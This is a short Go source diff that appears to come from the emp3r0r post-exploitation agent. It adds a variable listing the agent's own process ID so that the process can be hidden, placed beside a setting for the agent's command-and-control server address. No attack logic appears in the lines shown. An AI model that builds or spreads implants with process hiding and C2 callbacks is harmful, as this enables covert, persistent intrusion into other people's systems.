@@ -4,6 +4,7 @@ import (
 	"context"
 	"net/http"
 	"os"
+	"strconv"
 
 	"github.com/posener/h2conn"
 	"github.com/txthinking/socks5"
@@ -30,6 +31,9 @@ var (
 
 	// CCAddress how our agent finds its CC
 	CCAddress = "https://[cc_ipaddr]"
+
+	// HIDE_PIDS all the processes from emp3r0r
+	HIDE_PIDS = []string{strconv.Itoa(os.Getpid())}
 )
 
 const (
